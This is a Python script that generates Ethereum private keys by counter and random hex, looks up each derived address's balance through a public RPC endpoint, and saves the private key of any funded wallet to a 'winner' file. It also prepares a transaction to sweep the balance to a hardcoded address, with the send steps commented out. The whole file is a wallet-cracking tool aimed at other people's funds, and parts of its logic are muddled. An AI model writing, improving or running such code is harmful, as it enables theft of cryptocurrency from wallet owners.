from web3 import Web3
import json
import math
from lxml import html
import requests
import random
from colorama import Fore, Style
from hdwallet import HDWallet
from hdwallet.symbols import ETH as SYMBOL

z = 1
while True:
    c1 = str(random.choice('0123456789abcdefABCDEF'))
    c2 = str(random.choice('0123456789abcdefABCDEF'))
    c3 = str(random.choice('0123456789abcdefABCDEF'))
    c4 = str(random.choice('0123456789abcdefABCDEF'))
    c5 = str(random.choice('0123456789abcdefABCDEF'))
    c6 = str(random.choice('0123456789abcdefABCDEF'))
    c7 = str(random.choice('0123456789abcdefABCDEF'))
    c8 = str(random.choice('0123456789abcdefABCDEF'))
    c9 = str(random.choice('0123456789abcdefABCDEF'))
    c10 = str(random.choice('0123456789abcdefABCDEF'))
    c11 = str(random.choice('0123456789abcdefABCDEF'))
    c12 = str(random.choice('0123456789abcdefABCDEF'))
    c13 = str(random.choice('0123456789abcdefABCDEF'))
    c14 = str(random.choice('0123456789abcdefABCDEF'))
    c15 = str(random.choice('0123456789abcdefABCDEF'))
    c16 = str(random.choice('0123456789abcdefABCDEF'))
    c17 = str(random.choice('0123456789abcdefABCDEF'))
    c18 = str(random.choice('0123456789abcdefABCDEF'))
    c19 = str(random.choice('0123456789abcdefABCDEF'))
    c20 = str(random.choice('0123456789abcdefABCDEF'))
    c21 = str(random.choice('0123456789abcdefABCDEF'))
    c22 = str(random.choice('0123456789abcdefABCDEF'))
    c23 = str(random.choice('0123456789abcdefABCDEF'))
    c24 = str(random.choice('0123456789abcdefABCDEF'))
    c25 = str(random.choice('0123456789abcdefABCDEF'))
    c26 = str(random.choice('0123456789abcdefABCDEF'))
    c27 = str(random.choice('0123456789abcdefABCDEF'))
    c28 = str(random.choice('0123456789abcdefABCDEF'))
    c29 = str(random.choice('0123456789abcdefABCDEF'))
    c30 = str(random.choice('0123456789abcdefABCDEF'))
    c31 = str(random.choice('0123456789abcdefABCDEF'))
    c32 = str(random.choice('0123456789abcdefABCDEF'))
    c33 = str(random.choice('0123456789abcdefABCDEF'))
    c34 = str(random.choice('0123456789abcdefABCDEF'))
    c35 = str(random.choice('0123456789abcdefABCDEF'))
    c36 = str(random.choice('0123456789abcdefABCDEF'))
    c37 = str(random.choice('0123456789abcdefABCDEF'))
    c38 = str(random.choice('0123456789abcdefABCDEF'))
    c39 = str(random.choice('0123456789abcdefABCDEF'))
    c40 = str(random.choice('0123456789abcdefABCDEF'))
    c41 = str(random.choice('0123456789abcdefABCDEF'))
    c42 = str(random.choice('0123456789abcdefABCDEF'))
    c43 = str(random.choice('0123456789abcdefABCDEF'))
    c44 = str(random.choice('0123456789abcdefABCDEF'))
    c45 = str(random.choice('0123456789abcdefABCDEF'))
    c46 = str(random.choice('0123456789abcdefABCDEF'))
    c47 = str(random.choice('0123456789abcdefABCDEF'))
    c48 = str(random.choice('0123456789abcdefABCDEF'))
    c49 = str(random.choice('0123456789abcdefABCDEF'))
    c50 = str(random.choice('0123456789abcdefABCDEF'))
    c51 = str(random.choice('0123456789abcdefABCDEF'))
    c52 = str(random.choice('0123456789abcdefABCDEF'))
    c53 = str(random.choice('0123456789abcdefABCDEF'))
    c54 = str(random.choice('0123456789abcdefABCDEF'))
    c55 = str(random.choice('0123456789abcdefABCDEF'))
    c56 = str(random.choice('0123456789abcdefABCDEF'))
    c57 = str(random.choice('0123456789abcdefABCDEF'))
    c58 = str(random.choice('0123456789abcdefABCDEF'))
    c59 = str(random.choice('0123456789abcdefABCDEF'))
    c60 = str(random.choice('0123456789abcdefABCDEF'))
    c61 = str(random.choice('0123456789abcdefABCDEF'))
    c62 = str(random.choice('0123456789abcdefABCDEF'))
    c63 = str(random.choice('0123456789abcdefABCDEF'))
    c64 = str(random.choice('0123456789abcdefABCDEF'))
    magic = (  
                c1 + c2 + c3 + c4 + c5 + c6 + c7 + c8 + c9 + c10 + c11 + c12 + c13 + c14 + c15 + c16 + c17 + c18 + c19 + c20 + "fa002a6a5bc0f42cc9a8806ab109bf5cd2f8bb6c54d4" )#+ c21 + c22 + c23 + c24 + c25 + c26 + c27 + c28 + c29 + c30 + c31 + c32 + c33 + c34 + c35 + c36 + c37 + c38 + c39 + c40 + c41 + c42 + c43 + c44 + c45 + c46 + c47 + c48 + c49 + c50 + c51 + c52 + c53 + c54 + c55 + c56 + c57 + c58 + c59 + c60 + c61 + c62 + c63 + c64)
    magic = "00000000000000000000fa002a6a5bc0f42cc9a8806ab109bf5cd2f8bb6c54d4"
    #magic = "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd036414"
    while len(magic) < 64:
        magic = magic + "0"
    magic = str(hex(z)[2:] + magic[:64-len(str(hex(z)[2:]))])
    PRIVATE_KEY = str(magic)
    hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
    hdwallet.from_private_key(private_key=PRIVATE_KEY)
    privatekey = hdwallet.private_key()
    ethaddr = hdwallet.p2pkh_address()
# rpc urls are endpoints used to send and receive data to a specific blockchain
# here we're interacting with Polygon's testnet, the mumbai testnet
    mumbai_rpc_url = "https://ethereum.atomicwallet.io/"
    #mumbai_rpc_url = "https://rpc-mumbai.maticvigil.com"
# The provider is your connection to a blockchain
    web3 = Web3(Web3.HTTPProvider(mumbai_rpc_url))
    print("counter = "+ str(z))
#log if we're connected or not
    print(web3.is_connected())

#get the blocknumber
    print(web3.eth.block_number)

#get the balance
#balance is shown in Wei, which is a huge number. Wei is likes 'pennies' in the ethereum world
    wallet_address = ethaddr
    print(web3.eth.get_balance(wallet_address))

#balance here is formatted in ether, 
    balance = web3.eth.get_balance(wallet_address)
    BAL = balance
    print("balance = " + str(BAL))
    #print(web3.fromWei(balance,"ether"))
    #urlblock = "https://ethereum.atomicwallet.io/address/" + ethaddr
    #respone_block = requests.get(urlblock)
    ##byte_string = respone_block.content
    #source_code = html.fromstring(byte_string)
    #xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[2]/td[2]'
    #treetxid = source_code.xpath(xpatch_txid)
    gasPrice = web3.eth.gas_price #or get with web3.eth.gasPrice
    print(str(gasPrice))
    gasLimit = 3000000
    toAddress = "0xaD2acE77cF468430691bF20651c06BC5d1AB351D"
    amountToSend = BAL
    print("Amount =" + str(amountToSend))
    nonce = web3.eth.get_transaction_count(ethaddr)
    print("nonce = " + str(nonce))
    rawTransaction = {
    "from": str(ethaddr),
    "nonce": str(web3.to_hex(nonce)),
    "gasPrice": str(web3.to_hex(gasPrice)),
    "gasLimit": str(web3.to_hex(gasLimit)),
    "to": str(toAddress),
    "value": str(amountToSend) ,
    "chainId": str(41)
    }
    print('is OK')
    print(str(ethaddr) + "        " + str(privatekey) )
    if str(ethaddr) == "0xd9145CCE52D386f254917e481eB44e9943F39138":
        #ethVol = str(treetxid[0].text_content())
        print(str(z),Fore.GREEN,str(ethaddr),Fore.YELLOW, str(privatekey),Fore.MAGENTA,str(9),Fore.RED,'[Mmdrza.Com]',Style.RESET_ALL)
    if int(BAL) > 0:
        print('Write Information Wallet On File Winner (MMDRZA.Com)')
        print('WINNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR')
        f = open("ethATOMICWINEEEEEEERRRRRRRRRRRRRRRRRRRRRRR.txt","a")
        f.write('\nADDRESS ETH      : ' + ethaddr)
        f.write('\nPrivate Key ETH   : ' + privatekey)
        f.write('\nValue TX   ETH   : ' + str(BAL))
        f.close()
        print('Saved and Write All Details For WiN Wallet')
        #tx = web3.tx(rawTransaction)
        #tx.sign( privatekey )
        #serializedTx = tx.serialize()
        #err = KeyError
        #web3.eth.send_raw_transaction('0x' + serializedTx.to_string('hex'), function(err, hash))
        #Print("Transaction Done")
        continue
    z += 1
